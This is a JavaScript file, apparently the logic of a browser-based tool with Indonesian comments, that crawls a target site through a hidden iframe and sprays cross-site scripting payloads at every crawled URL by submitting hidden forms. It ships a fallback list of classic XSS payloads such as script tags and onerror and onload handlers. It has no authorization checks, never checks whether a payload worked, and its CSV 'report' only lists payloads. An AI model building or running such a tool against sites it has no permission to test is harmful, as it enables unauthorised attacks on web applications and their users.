const $ = q => document.querySelector(q);
const log = (txt, cls = '') => {
  const l = $('#logs');
  l.innerHTML += `<span class="${cls}">${txt}\n</span>`;
  l.scrollTop = l.scrollHeight;
};

let running = false;
let payloads = [];

// LOAD payloads.txt (DARI ROOT REPO)
async function loadPayloads() {
  try {
    const txt = await fetch('./payloads.txt').then(r => r.text());
    payloads = txt.split(/\r?\n/).filter(Boolean);
    log(`[+] Loaded ${payloads.length} payload dari repo`);
  } catch {
    log('[!] payloads.txt error, pakai fallback 100');
    payloads = [
      '"><script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "';alert(1)//",
      'javascript:alert(1)',
      '</script><script>alert(1)</script>',
      '"><svg onload=alert(1)>',
      '"><iframe src=javascript:alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>'
      // ... tambah 90 baris lagi kalau mau
    ];
  }
}

// CRAWL VIA IFRAME (NO CORS)
async function crawl(startUrl, max) {
  const res = [];
  const seen = new Set();
  return new Promise(resolve => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    $('#pool').appendChild(iframe);

    let count = 0;
    const next = () => {
      if (count >= max) {
        $('#pool').removeChild(iframe);
        resolve(res); return;
      }
      iframe.src = startUrl + '?page=' + count;
      iframe.onload = () => {
        try {
          const base = new URL(startUrl).origin;
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          const links = [...doc.querySelectorAll('a[href]')]
            .map(a => new URL(a.href, base).href)
            .filter(h => h.startsWith(base) && !seen.has(h));
          for (const u of links.slice(0, 5)) {
            if (res.length >= max) break;
            seen.add(u); res.push(u);
            log(`[+] ${res.length}/${max} ${u}`, 'ok');
          }
        } catch {}
        count++; setTimeout(next, 500);
      };
      iframe.onerror = () => { count++; setTimeout(next, 500); };
    };
    next();
  });
}

// SERANG VIA IFRAME FORM (NO CORS)
async function attack(urls, delay) {
  let attacked = 0, found = 0;
  const total = urls.length * payloads.length;
  for (const u of urls) {
    if (!running) break;
    for (const p of payloads) {
      if (!running) break;
      const id = 'x' + Math.random().toString(36).slice(2);
      const iframe = document.createElement('iframe');
      iframe.name = id; iframe.style.display = 'none';
      $('#pool').appendChild(iframe);

      const form = document.createElement('form');
      form.method = 'get'; form.action = u; form.target = id;
      form.innerHTML = `<input name="q" value="${p.replace(/"/g, '&quot;')}">`;
      $('#pool').appendChild(form);
      form.submit();

      attacked++;
      $('#total').textContent = attacked;
      $('#bar').style.width = `${(attacked / total * 100).toFixed(1)}%`;
      log(`${attacked}/${total} | ${p.slice(0, 60)}`, 'ok');

      await new Promise(r => setTimeout(r, delay));

      $('#pool').removeChild(form);
      $('#pool').removeChild(iframe);
    }
  }
}

// MAIN FLOW
$('#start').onclick = async () => {
  running = true;
  $('#start').disabled = true;
  $('#stop').disabled = false;
  $('#logs').innerHTML = '';
  await loadPayloads();

  const startUrl = $('#url').value.trim();
  const max = +$('#max').value;
  const delay = +$('#delay').value;

  log('[*] Mulai crawling…');
  const urls = await crawl(startUrl, max);
  log(`[+] Dapat ${urls.length} URL`);

  log('[*] Mulai serangan…');
  await attack(urls, delay);

  log('[+] Selesai.');
  running = false;
  $('#start').disabled = false;
  $('#stop').disabled = true;
};

$('#stop').onclick = () => running = false;

// EXPORT CSV
$('#export').onclick = () => {
  const csv = [['URL','Payload'], ...payloads.map(p => [$('#url').value, p])]
    .map(r => r.map(c => `"${c}"`).join(',')).join('\n');
  const blob = new Blob([csv], { type: 'text/csv' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'report.csv';
  a.click();
};
